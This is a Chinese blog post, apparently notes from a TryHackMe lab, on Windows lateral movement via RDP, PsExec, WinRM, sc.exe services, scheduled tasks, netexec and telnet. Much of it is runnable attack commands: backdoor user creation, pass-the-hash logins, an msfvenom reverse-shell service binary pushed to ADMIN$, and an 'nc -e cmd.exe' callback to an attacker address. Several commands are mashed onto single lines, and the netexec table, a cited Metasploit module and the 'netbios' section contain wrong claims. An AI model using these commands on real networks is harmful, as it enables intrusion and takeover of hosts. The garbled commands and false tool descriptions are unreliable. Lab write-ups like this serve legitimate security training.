---
title: "内网横向的一些方式"
date: "2025-01-29"
description: "多年来，Psexec 一直是需要远程执行进程时的首选方法。它允许管理员用户在他有权访问的任何 PC 上远程运行命令。 Psexec 是众多 Sysinternals 工具之一，可以在此处下载。"
---

#### [](#1-RDP "1. RDP")1\. RDP

##### [](#1-1-开启rdp "1.1 开启rdp")1.1 开启rdp

```shell
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f# 更改端口reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp" /v PortNumber /t REG_DWORD /d 3389 /freg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 3389 /f# 设置通过防火墙端口netsh advfirewall firewall set rule group="remote desktop" new enable=yes# 重启计算机shutdown /r /f /t 0# 可以重启服务避免重启计算机net stop termservicenet start termservice# powershellRestart-Service -Name "TermService"
```

##### [](#1-2-自建用户 "1.2 自建用户")1.2 自建用户

```shell
 net user hack hack /add发现添加不成功，后来发现是因为有密码设置策略，密码不能太简单且不能包含用户名 net user hack qaz@123
```

*   3389 开启就可以了  
    明文和hash都可以直接使用来达到连接的作用。

```shell
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH  
```

#### [](#2-Psexec-执行程序 "2. Psexec 执行程序")2\. Psexec 执行程序

*   **Ports:** 445/TCP (SMB)  
    **端口：** 445/ TCP （ SMB ）
*   **Required Group Memberships:** Administrators  
    \*\*所需的组成员身份：管理员

多年来，Psexec 一直是需要远程执行进程时的首选方法。它允许管理员用户在他有权访问的任何 PC 上远程运行命令。 Psexec 是众多 Sysinternals 工具之一，可以[在此处](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)下载。

##### [](#2-1-工作方式： "2.1 工作方式：")2.1 工作方式：

1.  
连接到 Admin$ 共享并上传服务二进制文件。 Psexec 使用 psexesvc.exe 作为名称。  
2.  
连接到服务控制管理器以创建并运行名为 PSEXESVC 的服务，并将服务二进制文件与`C:\Windows\psexesvc.exe`关联。  
3.  
创建一些命名管道来处理 stdin/stdout/stderr。

其实工作方式很明确了,就是通过一些通道或者一些东西来传输对应的命令。但是我们需要对面的管理员权限因此我们刚才的总基调就可以看到，我们只能使用域管理员和一些默认管理员  
进行一些管道的传输。

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a488102fe0da47a3667961400cf298d8.png)

要运行 psexec，我们只需提供远程主机所需的管理员凭据以及我们要运行的命令（为方便起见， `psexec64.exe`可在 THMJMP2 的`C:\tools`下找到）：  
只能对应的是管理员

```shell
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

##### [](#2-2-linux通过hash进行连接 "2.2  linux通过hash进行连接")2.2 linux通过hash进行连接

```shell
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IPpsexec.py administrator@172.22.15.24 -hashes '0e52d03e9b939997401466a0ec5a9cbc' -codec gbk
```

但是针对于psexec来讲，我们使用的pth 只能是linux版本的psexec 进行PTH利用hash凭据而并非明文就可以进行登陆。

##### [](#2-3-cs中的-psexec "2.3 cs中的 psexec")2.3 cs中的 psexec

#### [](#3-WinRM-远程创建进程 "3.  WinRM 远程创建进程")3\. WinRM 远程创建进程

##### [](#3-1-winrm-介绍 "3. 1 winrm 介绍")3\. 1 winrm 介绍

WinRM 使用 **SOAP** 协议来封装和传输命令和请求。WinRM 通过 **WS-Management**（Web Services Management）标准来进行通信，这个标准使用了 **SOAP** 来传递消息。

*   **SOAP**：是一种基于 XML 的协议，用于在计算机网络上交换结构化信息，尤其适用于 Web 服务通信。
*   **WS-Management**：是一个 Web 服务标准，用于通过网络远程管理系统。它基于 SOAP 和 HTTP(S) 协议实现，WinRM 就是实现了这一标准

1.  **请求和响应**：当你使用 WinRM 进行远程管理时，WinRM 客户端和服务器之间会通过 SOAP 消息来传递请求和响应。
2.  **SOAP 消息**：这些 SOAP 消息会通过 HTTP 或 HTTPS 协议传输，通常使用端口 5985 或 5986（HTTP 和 HTTPS）

*   **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)  
    **端口：** 5985/TCP (WinRM HTTP ) 或 5986/ TCP (WinRM HTTPS)
*   **Required Group Memberships:** Remote Management Users  
    \*\*所需的组成员身份：远程管理用户

*   管理员组也可以

远程管理员”这个术语强调的是管理操作的方式，而不仅仅是权限。即便某个用户是本地管理员，称为“远程管理员”是为了区分他们是通过远程工具（如远程桌面或 PsExec）来执行管理任务的。这种表述帮助明确管理员的管理操作是通过远程手段完成的，而不是在本地直接操作

Windows 远程管理 (WinRM) 是一种基于 Web 的协议，用于远程向 Windows 主机发送 Powershell 命令。大多数 Windows Server 安装都会默认启用 WinRM，这使其成为一个有吸引力的攻击媒介。

要从命令行连接到远程 Powershell 会话，我们可以使用以下命令：

```shell
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

我们可以从 Powershell 实现相同的目的，但要传递不同的凭据，我们需要创建一个 PSCredential 对象：

```powershell
$username = 'Administrator';$password = 'Mypass123';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

获得 PSCredential 对象后，我们可以使用 Enter-PSSession cmdlet 创建交互式会话：

```powershell
Enter-PSSession -Computername TARGET -Credential $credential
```

Powershell 还包括 Invoke-Command cmdlet，它通过 WinRM 远程运行 ScriptBlocks。凭证也必须通过 PSCredential 对象传递：

```powershell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

##### [](#3-2-evil-winrm "3.2   evil-winrm")3.2 evil-winrm

这是一个综合的工具，不仅仅是拿到shell  
[https://www.cnblogs.com/backlion/p/17202253.html](https://www.cnblogs.com/backlion/p/17202253.html)

```shell
# hashevil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH# 明文evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987
```

#### [](#4-使用-sc远程创建服务 "4. 使用 sc远程创建服务")4\. 使用 sc远程创建服务

*   **Ports: 端口：**
    *   135/TCP, 49152-65535/TCP (DCE/RPC)  
        135/ TCP ，49152-65535/ TCP （DCE/RPC）

只需要 rpc 和动态端口 ，445端口可以作为一个文件上传的利用点使用。

*   445/TCP (RPC over SMB Named Pipes)  
    445/ TCP （基于SMB命名管道的 RPC）
    
*   139/TCP (RPC over SMB Named Pipes)  
    139/ TCP （基于SMB命名管道的 RPC）
    
*   **Required Group Memberships:** Administrators  
    \*\*所需的组成员身份：\*\*管理员
    

Windows 服务也可用于运行任意命令，因为它们在启动时执行命令。虽然服务可执行文件在技术上与常规应用程序不同，但如果我们配置 Windows 服务来运行任何应用程序，它仍然会执行该应用程序并随后失败。启动服务居然可以任意执行相关命令 ，因此可以看到对应也可以执行对应的命令。

*   当你运行 `sc.exe \\TARGET create THMservice ...` 时，操作系统会检查当前用户（你在本机的凭证）是否有权限在远程机器 `TARGET` 上执行该操作。
*   如果当前用户在远程计算机上没有足够的权限（例如管理员权限），操作会失败，通常会返回类似“拒绝访问”或“权限不足”的错误。

SMB 协议和 445 端口的开放对于使用 `sc.exe` 来进行远程服务操作是非常重要的，但 **RPC 协议**（尤其是 135 端口和动态端口）也可能起到作用。因此，除了 445 端口外，RPC 相关端口也需要开放才能确保远程管理操作成功。

##### [](#4-1-创建-Windows-服务时的注意事项： "4.1 创建 Windows 服务时的注意事项：")4.1 创建 Windows 服务时的注意事项：

1.  **权限**：
    
    *   Windows 服务通常在系统级别运行，因此需要相应的权限。确保你有足够的权限来创建和管理服务。
    *   服务的账户可以是系统账户（如 LocalSystem、NetworkService）或特定用户账户。使用系统账户时，服务具有更高的权限，但也需要谨慎，以避免潜在的安全风险。
2.  **服务主程序**：
    
    *   服务的主程序通常是一个可执行文件（`.exe`）。这个可执行文件必须符合 Windows 服务的要求，即能够响应启动、停止、暂停等控制命令。
    *   常用的服务主程序框架包括 `.NET` 提供的 `ServiceBase` 类和 Windows API 提供的服务控制函数。
3.  **执行命令**：
    
    *   在服务启动时，你可以通过服务的主程序执行命令。通常，这些命令包括启动必要的进程、初始化资源等。
    *   在服务中执行命令时，需要处理好可能的错误和异常，以确保服务的稳定性。例如，启动时可能需要加载配置文件、建立网络连接等。
4.  **配置和管理**：
    
    *   服务的配置通常存储在注册表中，或者通过配置文件来管理。你可以使用 `sc` 命令、`PowerShell` 脚本或服务控制面板来安装、启动、停止和删除服务。
    *   在服务中执行命令时，确保命令的路径、环境变量等配置正确，以避免服务启动失败。
5.  **日志和监控**：
    
    *   服务通常需要有适当的日志记录机制，以便监控其运行状态和排查故障。确保服务能够记录必要的日志信息，例如启动成功、错误信息等。

我们可以使用 sc.exe（Windows 中提供的标准工具）在远程主机上创建服务。使用sc时，它会通过几种方式尝试通过RPC连接到服务控制管理器（SVCCTL）远程服务程序：

1.  将使用 DCE/RPC 进行连接尝试。客户端将首先在端口 135 连接到端点映射器 (EPM)，该端点映射器充当可用 RPC 端点的目录并请求有关 SVCCTL 服务程序的信息。然后，EPM 将响应 IP 和端口以连接到 SVCCTL，该端口通常是 49152-65535 范围内的动态端口。 其实这是rpc 协议的连接过程，先通过对应的EPM 端点映射

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c4f288e73da9c0f4d480ad817b365fe5.png)

1.  如果后一个连接失败，sc 将尝试通过端口 445 ( SMB ) 或 139 ( SMB over NetBIOS ) 上的SMB命名管道到达 SVCCTL。

![svcctl via named pipe](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0c425c37d692c771c944e38dca8c5879.png)  
所以我感觉应该是两个协议 ，一个是对应的rpc一个是smb 但是对应的服务可以执行相关命令。  
我们可以使用以下命令创建并启动名为“THMservice”的服务：

```shell
# 显示身份验证 psexec \\TARGET -u UserName -p Password sc create THMservice binPath= "net user munra Pass123 /add" start= autosc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= autosc.exe \\TARGET start THMservice
```

服务启动时将执行“net user”命令，在系统上创建一个新的本地用户。由于操作系统负责启动服务，因此您将无法查看命令输出。

要停止并删除该服务，我们可以执行以下命令：

```shell
sc.exe \\TARGET stop THMservicesc.exe \\TARGET delete THMservice
```

#### [](#5-远程创建计划任务 "5. 远程创建计划任务")5\. 远程创建计划任务

*   **Ports: 端口：**
    *   135/TCP, 49152-65535/TCP (DCE/RPC)  
        135/ TCP ，49152-65535/ TCP （DCE/RPC）

只需要 rpc 和动态端口 ，445端口可以作为一个文件上传的利用点使用。

*   445/TCP (RPC over SMB Named Pipes)  
    445/ TCP （基于SMB命名管道的 RPC）
*   139/TCP (RPC over SMB Named Pipes)  
    139/ TCP （基于SMB命名管道的 RPC）

我们可以使用的另一个 Windows 功能是计划任务。您可以使用 schtasks 远程创建并运行一个任务，该任务可在任何 Windows 安装中使用。要创建名为 THMtask1 的任务，我们可以使用以下命令：

```shell
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 schtasks /s TARGET /run /TN "THMtask1" 
```

我们将计划类型 (/sc) 设置为 ONCE，这意味着该任务仅在指定的时间和日期运行一次。由于我们将手动运行任务，因此开始日期 (/sd) 和开始时间 (/st) 无论如何都不重要。

由于系统将运行计划任务，因此我们将无法获得该命令的输出，这使得这是一种盲目攻击。

最后，要删除计划任务，我们可以使用以下命令并自行清理：

```powershell
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

#### [](#6-netexec "6 netexec")6 netexec

特性

**PSExec**

**netexec**

**底层协议**

使用 **SMB** 协议（默认）

可能使用其他协议，如 **NetBIOS** 或自定义协议

**功能**

远程执行命令，支持交互式会话、程序启动等

远程执行命令，功能较简洁，灵活性较高

**安全性和认证**

支持多种身份验证方式，如 NTLM、Kerberos

安全性和认证方式不一致，取决于工具实现

**使用场景**

渗透测试、远程管理、自动化任务

可能更多用于自定义工具集，或一些特殊环境

**工具广泛性**

非常常见，广泛应用

较少见，特定环境下使用

**平台兼容性**

支持多种 Windows 版本

兼容性较低，通常是自定义工具

一般来讲我感觉也是一种方式和方法，一般来讲这种底层协议smb 和netbios 都是底层协议不同

**在kali上安装了**

```shell
# smb 连接 netexec smb $(IP) -u ftpuser -p 'KeepGoingBro!!!'# ssh 连接netexec ssh $(IP) -u ftpuser -p 'KeepGoingBro!!!'# ftp 连接netexec ftp $(IP) -u ftpuser -p 'KeepGoingBro!!!'
```

##### [](#6-1-netexec-of-msf "6.1 netexec of msf")6.1 **netexec of msf**

**Metasploit 示例：**

1.  启动 Metasploit。
2.  选择模块（例如 `windows/smb/netexec`）。
3.  配置目标 IP、用户名、密码等参数。
4.  执行命令。

```shell
use exploit/windows/smb/netexecset RHOSTS 192.168.1.10set SMBUser administratorset SMBPass password123set PAYLOAD windows/meterpreter/reverse_tcpexploit
```

#### [](#7-实战实例 "7. 实战实例")7\. 实战实例

针对特定的本地任务

**用户：** ZA.TRYHACKME.COM\\t1\_leonard.summers  
**密码：** EZpass4ever

虽然我们已经展示了如何使用 sc 在远程系统上创建用户（通过使用`net user` ），但我们还可以上传我们想要执行的任何二进制文件并将其与创建的服务关联。但是，如果我们尝试使用此方法运行反向 shell，我们会注意到反向 shell 在执行后立即断开连接。原因是服务可执行文件与标准 .exe 文件不同，因此非服务可执行文件几乎会立即被服务管理器杀死。对我们来说幸运的是，msfvenom 支持`exe-service`格式，它将我们喜欢的任何有效负载封装在功能齐全的服务可执行文件中，防止它被杀死。

在 Windows 中，`.exe` 文件是可执行文件的标准扩展名，用于运行程序。而 `exe-service` 可能指的是在服务环境中运行的可执行程序，通常是 Windows 服务（Service），它们在后台运行并可以在系统启动时自动启动。

**主要区别**：

*   **`.exe` 文件**：直接运行的程序，用户可以通过双击打开。
*   **Windows 服务**：在后台运行的程序，通常以 `Service` 模式启动和管理。它们可以用 `sc` 命令或服务管理工具（如服务控制面板）来安装和管理。

因此分析一下目前我们的优势，首先我们目前有对应横向主机的一个管理员用户，并且此时我们准备打算采用sc.exe的方式来创建对应的一个服务同时来执行相关命令，我们不来创建用户我们来直接用一个服务的可执行文件，我们可以使用直接用这个负载来反弹一个shell。

但是此时我们准备横向的是THMIIS 并且此时我们已经拿到对应的相关的THMIIS 上的一个管理员的凭据 那么此时我准备尝试不同的方式去横向到对应的 服务器上。

##### [](#7-1-ssh尝试 "7.1 ssh尝试")7.1 ssh尝试

首先根据我们的主旨，我们需要横向到对应的主机。第一步肯定是伪装我们目前是处于一个thmjmp2 的机器上我目前还不知道它属于什么组。可以查一下经过命令查询可以看到它属于domain 和 internet组 但是我目前想知道他属于哪一个ou  
由于我发现我目前的凭证并不是管理员用户，所以我无法使用cmdlet 和mmc 进行收集。此时使用猎狗sharphound

首先使用ssh

```shell
ssh t1_leonard.summers@thmiis.za.tryhackme.com 
```

成功

##### [](#7-2-psexec "7.2 psexec")7.2 psexec

```shell
psexec64.exe \\thmiis.za.tryhackme.com  -u t1_leonard.summers   -p EZpass4ever -i cmd.exe
```

这个不知道为啥一直失败

##### [](#7-3-winrm "7.3 winrm")7.3 winrm

```shell
winrs.exe -u:t1_leonard.summers -p:EZpass4ever -r:thmiis.za.tryhackme.com  cmd
```

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240907211732.png)

##### [](#7-4-sc-exe "7.4 sc.exe")7.4 sc.exe

windows服务相关的内容不再赘述，我们直接生成对应的exe-service

```shell
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.148.56 LPORT=4444 -o k1t0service.exe
```

然后，我们将继续使用 t1\_leonard.summers 凭据，使用 AttackBox 中的 smbclient 将有效负载上传到 THMIIS 的 ADMIN$ 共享：

```shell
smbclient -c 'put k1t0service.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240907213326.png)  
上传可执行文件后，我们将在攻击者的计算机上设置一个侦听器以接收来自`msfconsole`的反向 shell：

```shell
user@AttackBox$ msfconsolemsf6 > use exploit/multi/handlermsf6 exploit(multi/handler) > set LHOST lateralmovementmsf6 exploit(multi/handler) > set LPORT 4444msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcpmsf6 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 10.10.10.16:4444
```

由于`sc.exe`不允许我们在命令中指定凭据，因此我们需要使用`runas`来生成带有 t1\_leonard.summer 访问令牌的新 shell。尽管如此，我们只能通过SSH访问机器，所以如果我们尝试类似的操作 `runas /netonly /user:ZA\t1_leonard.summers cmd.exe` ，新的命令提示符将在用户的会话中生成，但我们无法访问它。为了解决这个问题，我们可以使用 runas 生成带有 t1\_leonard.summers 访问令牌的第二个反向 shell：  
其实这句话看似很难理解，其实仔细想一想真的很难理解吗？ HAHAH 其实只是因为啥呢?只是因为我们是用攻击盒进行渗透的。所以如果说我们runas 之后/netonly 我们在盒子上是看不到这个cmd 会话的

```shell
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.148.56 4443"
```

此时需要在盒子上开一个nc -nvlp 4443  
最后，继续使用 sc 远程创建一个新服务，并将其与我们上传的二进制文件关联起来：

```shell
C:\> sc.exe \\thmiis.za.tryhackme.com create THMservice-3244 binPath= "%windir%\k1t0service.exe" start= autoC:\> sc.exe \\thmiis.za.tryhackme.com start THMservice-3244
```

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240908100905.png)

成功使用sc 服务反弹回来一个shell ，并且是根据一个负载和一个服务捆绑。  
但是一定要注意，我们的服务名称和一个服务的路径一定要是独属于自己的。

#### [](#8-netbios "8. netbios")8\. netbios

netbios也是一个远程控制的一个协议,通过netbios我们可以像ssh一样进行一个远程控制

##### [](#8-1-开启netbios "8.1 开启netbios")8.1 开启netbios

```shell
sc config tlntsvr start= autonet start telnet# 查看23 端口netstat -an
```

##### [](#8-2-msf连接 "8.2 msf连接")8.2 msf连接

```shell
use auxiliary/scanner/telnet/telnet_loginset RHOSTS 192.168.52.141set username hackset PASSWORD qaz@123exploit
```

#### [](#9-vnc "9.vnc")9.vnc

vnc并不是windows自带服务,我们要先判断是否vnc服务已经安装.

1.  netstat -an | find “5900”

```shell
TCP 0.0.0.0:5900 0.0.0.0:0 LISTENING
```

2.  服务  
    VNC 服务器通常会作为 Windows 服务启动。你可以通过以下步骤查看是否有 VNC 服务：

*   . 按 **Win + R** 键，输入 `services.msc` 然后按回车。
*   . 在服务列表中，查看是否有以下服务：
    *   **TightVNC Server** 或 **VNC Server**。
    *   **UltraVNC Server**。
    *   **RealVNC Server**。

3.  进程

你可以检查系统中是否有 VNC 服务或相关进程正在运行：

*   按 **Ctrl + Shift + Esc** 打开 **任务管理器**。
*   查看是否有以下进程：
    *   **vncserver.exe** 或 **tvnserver.exe**（TightVNC）
    *   **winvnc.exe**（UltraVNC）
    *   **vncserver.exe**（RealVNC）
